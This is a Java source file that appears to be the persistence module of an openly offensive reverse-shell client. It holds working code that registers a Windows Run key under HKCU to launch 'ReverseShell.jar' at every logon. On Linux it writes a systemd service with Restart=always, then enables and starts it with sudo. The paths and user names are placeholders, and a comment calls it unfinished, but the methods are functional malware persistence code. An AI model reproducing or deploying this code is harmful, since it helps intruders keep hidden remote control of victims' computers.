package obs1d1anc1ph3r.reverseshell.client.utils;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Persistence {

	//Yeah, this doesn't do anything yet
	//ToDo -- Make this actually do shit
	public static void setup() {
		if (OSUtils.isWindows()) {
			addToRegistry();
		} else {
			addSystemdService();
		}
	}

	//Windows
	public static void addToRegistry() {
		try {
			String command = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ReverseShell /t REG_SZ /d \"java -jar path\\to\\ReverseShell.jar\" /f";
			Process process;
			process = Runtime.getRuntime().exec(command);
			process.waitFor();
			System.out.println("[*] Persistence set via Windows Registry");
		} catch (IOException | InterruptedException e) {
			System.err.println("[ERROR] Failed to set persistence: " + e.getMessage());
		}
	}

	//Linux
	public static void addSystemdService() {
		try {
			String serviceContent
				= """
                      [Unit]
                      Description=Reverse Shell Client
                      After=network.target
                      
                      [Service]
                      ExecStart=/usr/bin/java -jar /path/to/ReverseShell.jar
                      WorkingDirectory=/path/to/your/program
                      Restart=always
                      User=your_user_name
                      Group=your_group_name
                      
                      [Install]
                      WantedBy=multi-user.target
                      """;

			String serviceFilePath = "/etc/systemd/system/reverse-shell-client.service";
			Files.write(Paths.get(serviceFilePath), serviceContent.getBytes());

			Process reloadProcess = Runtime.getRuntime().exec("sudo systemctl daemon-reload");
			reloadProcess.waitFor();

			Process enableProcess = Runtime.getRuntime().exec("sudo systemctl enable reverse-shell-client.service");
			enableProcess.waitFor();

			Process startProcess = Runtime.getRuntime().exec("sudo systemctl start reverse-shell-client.service");
			startProcess.waitFor();

			System.out.println("[*] Persistence set via systemd service");
		} catch (IOException | InterruptedException e) {
			System.err.println("[ERROR] Failed to set persistence via systemd: " + e.getMessage());
		}
	}
}
